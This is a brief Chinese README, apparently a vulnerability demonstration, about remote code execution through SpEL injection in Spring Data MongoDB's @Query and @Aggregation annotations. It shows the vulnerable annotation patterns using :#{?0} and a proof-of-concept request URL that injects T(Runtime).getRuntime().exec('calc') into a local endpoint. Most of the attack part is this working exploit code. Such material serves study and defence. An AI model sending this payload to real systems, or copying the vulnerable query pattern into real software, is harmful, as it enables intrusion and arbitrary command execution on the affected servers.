# Spring data Mongodb

项目移至：

> https://github.com/Kyo-w/mongodb-HelloWorld

​	@Qeury和@Aggregation可导致RCE

```
@Aggregation("{ $group: { _id : $lastname, names : { $addToSet : :#{?0} } } }")

@Query(":#{?0}")
```

## 远程RCE

发起请求

```
http://127.0.0.1:8080/get/T(Runtime).getRuntime().exec('calc')
```

